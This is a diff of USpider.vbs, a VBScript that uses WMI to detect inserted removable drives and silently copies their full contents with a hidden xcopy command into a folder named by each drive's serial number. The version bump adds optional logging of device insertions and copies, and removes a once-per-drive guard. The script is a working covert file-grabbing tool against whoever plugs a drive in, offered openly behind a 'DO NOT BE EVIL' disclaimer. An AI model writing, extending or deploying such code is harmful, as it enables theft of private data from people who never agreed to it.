@@ -1,4 +1,4 @@
-' Uspider v1.2.0 by jimmy19990
+' Uspider v1.3.0 by jimmy19990
 ' ==========================
 ' With great might comes great responsibility. DO NOT BE EVIL.
 ' URL: https://github.com/jimmy19990/USpider.vbs
@@ -6,6 +6,12 @@
 ' -------------------
 ' Configurations
 ' -------------------
+'
+' Logging
+'
+' Set this option to "true" if you want logs.
+'
+logging = false
 '
 ' Destination Folder
 '
@@ -48,15 +54,19 @@ Set colEvents = objWMIService.ExecNotificationQuery _
     ("Select * From __InstanceOperationEvent Within 10 Where " _
         & "TargetInstance isa 'Win32_LogicalDisk'")
 
-' Record availability to avoid repeat copyings.
-Dim isAvailable(26)
-For i = 0 to 25
-    isAvailable(i) = true
-Next
-
 ' Initialize Destination Folder.
 If objFileSystem.folderExists(destFolder) = false Then
     objFileSystem.CreateFolder destFolder
+End If
+
+' Initialize logging.
+If logging = true Then
+    If objFileSystem.FileExists("Uspider_log.txt") = false Then
+        Set objLogFile = objFileSystem.CreateTextFile("Uspider_log.txt")
+        objLogFile.Close
+    End If
+    Set objLogFile = objFileSystem.OpenTextFile("Uspider_log.txt", 8, True)
+    objLogFile.Write("[" & Now & "] " & "Uspider is now started...") & vbcrlf
 End If
 
 Do While True
@@ -66,34 +76,41 @@ Do While True
         Select Case objEvent.Path_.Class
             ' Insert
             Case "__InstanceCreationEvent"
-                ' Ensure only copy once.
-                If isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = true Then
-                    ' Check if the device is in custom list.
-                    isExcluded = false
-                    If VarType(customList) = 8204 Then
-                        If InStr(Join(customList, "|"), objEvent.TargetInstance.VolumeSerialNumber) > 0 Then
-                            isExcluded = true
-                        End If
-                    End If
-                    
-                    If isExcluded = isBlackList Then
-                        ' Initialize Work Folder.
-                        workFolder = destFolder + "\" + objEvent.TargetInstance.VolumeSerialNumber
-                        If objFileSystem.folderExists(workFolder) = false Then
-                            objFileSystem.CreateFolder workFolder
-                        End If
-                        ' Copy All Files.
-                        c = "cmd.exe /c xcopy " + objEvent.TargetInstance.DeviceId + "\* " + workFolder + " " + xcopyParameters
-                        objWScriptShell.Run(c), 0
-                    End If
-                        
-                    ' Update availability.
-                    isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = false
+                If logging = true Then
+                    objLogFile.Write("[" & Now & "] " & "New Device Inserted. DeviceID: " & objEvent.TargetInstance.DeviceId & _
+                    " | Label: " & objEvent.TargetInstance.VolumeName & " | SN:" & objEvent.TargetInstance.VolumeSerialNumber) & vbcrlf
                 End If
-            ' Eject
+                ' Ensure only copy once.
+                ' Check if the device is in custom list.
+                isExcluded = false
+                If VarType(customList) = 8204 Then
+                    If InStr(Join(customList, "|"), objEvent.TargetInstance.VolumeSerialNumber) > 0 Then
+                        isExcluded = true
+                    End If
+                    If logging = true Then
+                        objLogFile.Write("[" & Now & "] " & "isExcluded = " & isExcluded) & vbcrlf
+                    End If
+                End If
+                
+                If isExcluded = isBlackList Then
+                    ' Initialize Work Folder.
+                    workFolder = destFolder + "\" + objEvent.TargetInstance.VolumeSerialNumber
+                    If objFileSystem.folderExists(workFolder) = false Then
+                        objFileSystem.CreateFolder workFolder
+                    End If
+                    ' Copy All Files.
+                    copyCommand = "cmd.exe /c xcopy " + objEvent.TargetInstance.DeviceId + "\* " + workFolder + " " + xcopyParameters
+                    objWScriptShell.Run(copyCommand), 0
+                    If logging = true Then
+                        objLogFile.Write("[" & Now & "] " & "Files copied from " & objEvent.TargetInstance.DeviceId & "\ to " & workFolder) & vbcrlf
+                    End If
+                End If
+            ' Remove
             Case "__InstanceDeletionEvent"
-                ' Update availability.
-                isAvailable(Asc(Left(objEvent.TargetInstance.DeviceId, 1))-65) = true
+                If logging = true Then
+                    objLogFile.Write("[" & Now & "] " & "Device Removed. DeviceID: " & objEvent.TargetInstance.DeviceId & _
+                    " | Label: " & objEvent.TargetInstance.VolumeName & " | SN:" & objEvent.TargetInstance.VolumeSerialNumber) & vbcrlf
+                End If
         End Select
     End If
 Loop
